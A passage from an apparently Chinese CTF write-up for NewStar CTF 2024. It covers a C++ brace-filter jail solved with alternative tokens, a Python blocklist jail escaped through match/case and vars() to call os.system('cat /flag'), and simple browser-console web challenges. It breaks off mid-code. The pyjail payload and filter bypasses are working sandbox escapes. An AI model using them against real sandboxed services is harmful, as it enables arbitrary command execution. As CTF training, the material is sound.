<li><strong>字符映射(Character Mapping)</strong>：文件中的物理源字符被映射到源字符集中，其中包括三字符运算符的替换、控制字符(行尾的回车换行)的替换。许多非美式键盘不支持基本源字符集中的一些字符，文件中可用三字符来代替这些基本源字符，以??为前导。<br>但如果所用键盘是美式键盘，有些编译器可能不对三字符进行查找和替换，需要增加-trigraphs编译参数。在C++程序中，任何不在基本源字符集中的字符都被它的通用字符名替换。</li>
<li><strong>行合并(Line Splicing)</strong>：以反斜杠\结束的行和它接下来的行合并。</li>
<li><strong>标记化(Tokenization)</strong>：每一条注释被一个单独的空字符所替换。C++双字符运算符被识别为标记(为了开发可读性更强的程序，C++为非ASCII码开发者定义了一套双字符运算符集和新的保留字集)。源代码被分析成预处理标记。</li>
<li><strong>预处理(Preprocessing)</strong>：调用预处理指令并扩展宏。使用#include指令包含的文件，重复步骤1到4。上述四个阶段统称为预处理阶段。</li>
<li><strong>字符集映射(Character-set Mapping)</strong>：源字符集成员、转义序列被转换成等价的执行字符集成员。例如：’\a’在ASCII环境下会被转换成值为一个字节，值为7。</li>
<li><strong>字符串连接(String Concatenation)</strong>：相邻的字符串被连接。例如：”””Hello””World”将成为”HelloWorld”。</li>
<li><strong>翻译(Translation)</strong>：进行语法和语义分析C++编译，并翻译成目标代码。</li>
<li>处理模板处理模板实例。</li>
<li><strong>连接(Linkage)</strong>：解决外部引用的问题，准备好程序映像以便执行。</li>
</ul>
<p>所以，我们可以使用代用字符或者三标符来替换掉<code>&#123;&#125;</code>，但是使用三标符在C++17及以后已经被移除，所以我们这道题应该使用代用字符</p>
<p>下面是代用字符表格</p>
<table>
<thead>
<tr>
<th>现代字符</th>
<th>代用字符</th>
</tr>
</thead>
<tbody><tr>
<td><code>&amp;&amp;</code></td>
<td><code>and</code></td>
</tr>
<tr>
<td><code>&amp;=</code></td>
<td><code>and_eq</code></td>
</tr>
<tr>
<td><code>&amp;</code></td>
<td><code>bitand</code></td>
</tr>
<tr>
<td>&#96;</td>
<td>&#96;</td>
</tr>
<tr>
<td><code>~</code></td>
<td><code>compl</code></td>
</tr>
<tr>
<td><code>!</code></td>
<td><code>not</code></td>
</tr>
<tr>
<td><code>!=</code></td>
<td><code>not_eq</code></td>
</tr>
<tr>
<td>||</td>
<td><code>or</code></td>
</tr>
<tr>
<td>&#96;</td>
<td>&#x3D;&#96;</td>
</tr>
<tr>
<td><code>^</code></td>
<td><code>xor</code></td>
</tr>
<tr>
<td><code>^=</code></td>
<td><code>xor_eq</code></td>
</tr>
<tr>
<td><code>&#123;</code></td>
<td><code>&lt;%</code></td>
</tr>
<tr>
<td><code>&#125;</code></td>
<td><code>%&gt;</code></td>
</tr>
<tr>
<td><code>[</code></td>
<td><code>&lt;:</code></td>
</tr>
<tr>
<td><code>]</code></td>
<td><code>:&gt;</code></td>
</tr>
<tr>
<td><code>#</code></td>
<td><code>%:</code></td>
</tr>
<tr>
<td><code>##</code></td>
<td><code>%:%:</code></td>
</tr>
</tbody></table>
<p>所以说，我们可以使用<code>&lt;%</code>来代替<code>&#123;</code>，使用<code>%&gt;</code>来代替<code>&#125;</code>，最终得到了如下的代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">user_code</span><span class="params">()</span> &lt;%</span></span><br><span class="line"><span class="function">	<span class="title">printf</span><span class="params">(<span class="string">&quot;Hello, World!&quot;</span>)</span></span>;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>经过b64编码后结果为<code>dm9pZCB1c2VyX2NvZGUoKSA8JQoJcHJpbnRmKCJIZWxsbywgV29ybGQhIik7CiU+</code>，然后输入到我们的做题区域里面，就能够得到flag了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/vmware_11fSNTDkLv.png"></p>
<h4 id="可能的非预期做法"><a href="#可能的非预期做法" class="headerlink" title="可能的非预期做法"></a>可能的非预期做法</h4><p>在Python源代码中，我们能够看到限制条件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cpp_code_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;#include&quot;</span> <span class="keyword">in</span> code:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;Code is not allowed to include libraries&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;#define&quot;</span> <span class="keyword">in</span> code:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;Code is not allowed to use macros&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> code <span class="keyword">or</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> code:</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&quot;Code is not allowed to use `&#123;` or `&#125;`,but it needs to be a single function&quot;</span>,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(code) &gt; <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;Code is too long&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;Code is valid&quot;</span></span><br></pre></td></tr></table></figure>

<p>说是不能够使用<code>#include</code>、<code>#define</code>、<code>&#123;&#125;</code>，但是其实<code>#</code>和后面的<code>include</code>或者<code>define</code>有空格，也能够被g++识别</p>
<p>也就是说，如果我按照下面这样子写</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> user_code() write(1, <span class="string">&quot;Hello, World!&quot;</span>, 13)</span></span><br></pre></td></tr></table></figure>

<p>也能够成功定义<code>user_code</code>，让它写出<code>Hello, World!</code>，其中<code>write</code>中的<code>1</code>代表了标准输出，而<code>13</code>代表了我们输出的字符长度，<code>Hello, World!</code>的长度正是13</p>
<p>此外，本题目还有其他做法（详情请见官方WP &#x3D;&gt; <a href="https://ns.openctf.net/wp/2024/week3/misc/ez_jail.html">ez_jail | WriteUp - NewStar CTF 2024</a>）</p>
<h3 id="pyjail（赛后做出）"><a href="#pyjail（赛后做出）" class="headerlink" title="pyjail（赛后做出）"></a>pyjail（赛后做出）</h3><blockquote>
<p>咦？居然有一个神秘的 Python 程序跳出来，声称是无敌的「小小魔法牢笼」！它还傲娇地说，谁都别想逃出去！你作为超级聪明的魔法少女，怎么可能被困住嘛！不过，牢笼里面有好多限制，很多魔法（比如那些调用系统的咒语）都被封印了呢。</p>
<p>现在，考验你真正魔法实力的时候到了！快点动动你的小脑袋，在这个受限的环境里用智慧突破重重封印，找到被藏起来的 flag！你一定可以的，勇敢向前冲吧！</p>
</blockquote>
<p>nc连接后输入<code>source</code>能够得到关键代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">black_list = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;setattr&#x27;</span>,<span class="string">&#x27;delattr&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;global&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;builtin&#x27;</span>,<span class="string">&#x27;input&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;help&#x27;</span>,<span class="string">&#x27;breakpoint&#x27;</span>,<span class="string">&#x27;license&#x27;</span>,<span class="string">&#x27;byte&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_ascii</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">assert</span> code.isascii()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_black_list</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">assert</span> item <span class="keyword">not</span> <span class="keyword">in</span> code,<span class="string">f&#x27;bad: <span class="subst">&#123;item&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    code = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        _ = <span class="built_in">input</span>()</span><br><span class="line">        <span class="keyword">if</span> _ == <span class="string">&#x27;EOF&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        code += _ + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    check_ascii(code)</span><br><span class="line">    check_black_list(code)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(code)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Exception!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>很明显就是禁用了很多常规的越狱手段，这时候看到参考文档</p>
<blockquote>
<p><a href="https://ns.openctf.net/guide/2024/week5.html#pyjail">Week 5 | 参考文档 - NewStar CTF 2024</a></p>
</blockquote>
<p>告诉我们要用<code>match ... case</code>的做法，在此之前，我先修改了一下题目给的源码，方便本地调试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">black_list = [</span><br><span class="line">    <span class="string">&quot;import&quot;</span>,</span><br><span class="line">    <span class="string">&quot;getattr&quot;</span>,</span><br><span class="line">    <span class="string">&quot;setattr&quot;</span>,</span><br><span class="line">    <span class="string">&quot;delattr&quot;</span>,</span><br><span class="line">    <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="string">&quot;global&quot;</span>,</span><br><span class="line">    <span class="string">&quot;local&quot;</span>,</span><br><span class="line">    <span class="string">&quot;builtin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;input&quot;</span>,</span><br><span class="line">    <span class="string">&quot;compile&quot;</span>,</span><br><span class="line">    <span class="string">&quot;help&quot;</span>,</span><br><span class="line">    <span class="string">&quot;breakpoint&quot;</span>,</span><br><span class="line">    <span class="string">&quot;license&quot;</span>,</span><br><span class="line">    <span class="string">&quot;byte&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[&quot;</span>,</span><br><span class="line">    <span class="string">&quot;+&quot;</span>,</span><br><span class="line">    <span class="string">&quot;#&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#x27;&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;&#123;&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_ascii</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">assert</span> code.isascii()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_black_list</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> black_list:</span><br><span class="line">            <span class="keyword">assert</span> item <span class="keyword">not</span> <span class="keyword">in</span> code, <span class="string">f&quot;bad: <span class="subst">&#123;item&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span> AssertionError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;bad: <span class="subst">&#123;item&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            _ = <span class="built_in">input</span>()</span><br><span class="line">            <span class="keyword">if</span> _ == <span class="string">&quot;EOF&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            code += _ + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">        check_ascii(code)</span><br><span class="line">        check_black_list(code)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">exec</span>(code))</span><br><span class="line">        <span class="keyword">except</span>: </span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先我们按照题目的要求，构造我们需要的一些字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">str</span>():</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">str</span>(join=join):</span><br><span class="line">        built = join(<span class="built_in">list</span>((<span class="built_in">chr</span>(<span class="number">95</span>), <span class="built_in">chr</span>(<span class="number">95</span>), <span class="built_in">chr</span>(<span class="number">98</span>), <span class="built_in">chr</span>(<span class="number">117</span>), <span class="built_in">chr</span>(<span class="number">105</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">105</span>), <span class="built_in">chr</span>(<span class="number">110</span>), <span class="built_in">chr</span>(<span class="number">115</span>), <span class="built_in">chr</span>(<span class="number">95</span>), <span class="built_in">chr</span>(<span class="number">95</span>)))) <span class="comment"># __builtins__</span></span><br><span class="line">        imp = join(<span class="built_in">list</span>((<span class="built_in">chr</span>(<span class="number">95</span>), <span class="built_in">chr</span>(<span class="number">95</span>), <span class="built_in">chr</span>(<span class="number">105</span>), <span class="built_in">chr</span>(<span class="number">109</span>), <span class="built_in">chr</span>(<span class="number">112</span>), <span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">114</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">95</span>), <span class="built_in">chr</span>(<span class="number">95</span>))))  <span class="comment"># __import__</span></span><br><span class="line">        os_str = join(<span class="built_in">list</span>((<span class="built_in">chr</span>(<span class="number">111</span>), <span class="built_in">chr</span>(<span class="number">115</span>))))   <span class="comment"># os</span></span><br><span class="line">        sys_str = join(<span class="built_in">list</span>((<span class="built_in">chr</span>(<span class="number">115</span>), <span class="built_in">chr</span>(<span class="number">121</span>), <span class="built_in">chr</span>(<span class="number">115</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">101</span>), <span class="built_in">chr</span>(<span class="number">109</span>))))  <span class="comment"># system</span></span><br><span class="line">        cmd = join(<span class="built_in">list</span>((<span class="built_in">chr</span>(<span class="number">99</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">116</span>), <span class="built_in">chr</span>(<span class="number">32</span>), <span class="built_in">chr</span>(<span class="number">47</span>), <span class="built_in">chr</span>(<span class="number">102</span>), <span class="built_in">chr</span>(<span class="number">108</span>), <span class="built_in">chr</span>(<span class="number">97</span>), <span class="built_in">chr</span>(<span class="number">103</span>)))) <span class="comment"># cat /flag</span></span><br></pre></td></tr></table></figure>

<p>然后我们要获得os对象才能够执行system，但是我试了很久发现不行，去问了一下下unk</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/1731339383426.png"></p>
<p>告诉我要看vars()，而vars说白了就是返回某个对象里面有些什么方法或者变量，以字典方式返回，但同时也要求此对象&#x2F;变量为dict类型或者能被dict方式访问</p>
<p>所以我们照葫芦画瓢，match我们的<code>vars()</code>，然后case里面把dict的<code>get</code>方法弄出来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">vars</span>():</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">dict</span>(get=get):</span><br><span class="line">        built_obj = <span class="built_in">vars</span>(get(built))</span><br><span class="line">        <span class="keyword">match</span> built_obj:</span><br><span class="line">            <span class="keyword">case</span> <span class="built_in">dict</span>(get=built_get):</span><br><span class="line">                os = <span class="built_in">vars</span>(built_get(imp)(os_str))</span><br><span class="line">                <span class="keyword">match</span> os:</span><br><span class="line">                    <span class="keyword">case</span> <span class="built_in">dict</span>(get=os_get):</span><br><span class="line">                        os_get(sys_str)(cmd)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里可能有点难懂，我上一个GPT的解释（注意get&#x3D;xxx里面xxx是方法绑定的变量）</p>
<blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> <span class="built_in">vars</span>():</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">dict</span>(get=get):</span><br></pre></td></tr></table></figure>

<ul>
<li><code>vars()</code> 返回当前局部变量的字典。<code>case dict(get=get)</code> 将 <code>get</code> 方法绑定为 <code>get</code> 变量，允许在字典中查找键值。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">built_obj = <span class="built_in">vars</span>(get(built))</span><br></pre></td></tr></table></figure>

<ul>
<li><code>get(built)</code> 返回 <code>__builtins__</code> 对象，其中包含 Python 内置的所有模块、函数和变量。<code>vars()</code> 将其转换为字典存储在 <code>built_obj</code> 中。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> built_obj:</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">dict</span>(get=built_get):</span><br></pre></td></tr></table></figure>

<ul>
<li>将 <code>built_obj</code> 中的 <code>get</code> 方法绑定到 <code>built_get</code>，用于在 <code>__builtins__</code> 中查找特定值。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os = <span class="built_in">vars</span>(built_get(imp)(os_str))</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 <code>built_get(imp)(os_str)</code> 动态调用 <code>__import__(&quot;os&quot;)</code>，导入 <code>os</code> 模块。再通过 <code>vars()</code> 将其属性转换为字典，存储在 <code>os</code> 中。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">match</span> os:</span><br><span class="line">    <span class="keyword">case</span> <span class="built_in">dict</span>(get=os_get):</span><br></pre></td></tr></table></figure>

<ul>
<li>将 <code>os</code> 字典的 <code>get</code> 方法绑定为 <code>os_get</code>，以便后续查找 <code>os.system</code>。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os_get(sys_str)(cmd)</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 <code>os_get(sys_str)</code> 找到 <code>os.system</code> 方法，执行 <code>cmd</code>（即 <code>cat /flag</code> 命令），从而读取文件内容。</li>
</ul>
</blockquote>
<p>然后把这些东西输入到题目里面，就得到flag了，flag为<code>flag&#123;U_R_the_m4ster_0f_Pyth0n_jai1!&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/vmware_m6ZrXCuZyW.png"></p>
<p>最后提交到题目，就正确了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_rpp2ulLR5u.png"></p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="headach3"><a href="#headach3" class="headerlink" title="headach3"></a>headach3</h3><blockquote>
<p>头疼，帮我治治</p>
<p>【难度：签到】</p>
</blockquote>
<p>提示很明显，让我们看相应标头（HEAD），就能够找到了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_hXwgPGCG2I.png"></p>
<h3 id="会赢吗"><a href="#会赢吗" class="headerlink" title="会赢吗"></a>会赢吗</h3><blockquote>
<p>什么是控制台？js又是什么</p>
<p>本题下发后，请通过http访问相应的ip和port，例如 nc ip port ，改为<a href="http://ip:port/）">http://ip:port/）</a></p>
<p>【难度：简单】</p>
</blockquote>
<h4 id="入学啦！"><a href="#入学啦！" class="headerlink" title="入学啦！"></a>入学啦！</h4><blockquote>
<p>你考入了咒术高专<br>但是出门前你因为太兴奋而忘记了带录取通知书<br>你能找到录取通知书吗？</p>
</blockquote>
<p>在开发者工具里面就能在注释里面找到入口了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/2U4RpusefF.png"></p>
<h4 id="掌握术式"><a href="#掌握术式" class="headerlink" title="掌握术式"></a>掌握术式</h4><blockquote>
<p>开学第一课<br>五条老师传授给你们一种名为javascript的术式，这种术式可以在控制台进行一系列的应用<br>你能掌握js的用法吗？</p>
</blockquote>
<p>在控制台可以发现js代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/msedge_MPK0CdwsOz.png"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">revealFlag</span>(<span class="params">className</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`/api/flag/<span class="subst">$&#123;className&#125;</span>`</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">if</span> (response.<span class="property">ok</span>) &#123;</span><br><span class="line">            <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`恭喜你！你获得了第二部分的 flag: <span class="subst">$&#123;data.flag&#125;</span>\n……\n时光荏苒，你成长了很多，也发生了一些事情。去看看吧：/<span class="subst">$&#123;data.nextLevel&#125;</span>`</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;请求失败，请检查输入或服务器响应。&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;请求过程中出现错误:&#x27;</span>, error);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 控制台提示</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;你似乎对这门叫做4cqu1siti0n的课很好奇？那就来看看控制台吧！&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>用Hackbar来发起POST请求，就可以得到我们的这部分flag了</p>
<h5 id="第二种做法"><a href="#第二种做法" class="headerlink" title="第二种做法"></a>第二种做法</h5><p>在html中修改按钮的属性，加上一个<code>onclick=&quot;revealFlag(&#39;4cqu1siti0n&#39;)&quot;</code>再点一下就行了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/cloudmusic_bJiaHmmPzH.png"></p>
<h4 id="被封印了"><a href="#被封印了" class="headerlink" title="被封印了"></a>被封印了</h4><blockquote>
<p>走不出的三年，走不出的苦夏<br>被羂索控制的夏油杰使用狱门疆封印了五条悟<br>你能救出五条老师吗？</p>
</blockquote>
<p>打开控制台，还是能看到js代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> form = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;seal_him&#x27;</span>);</span><br><span class="line">    <span 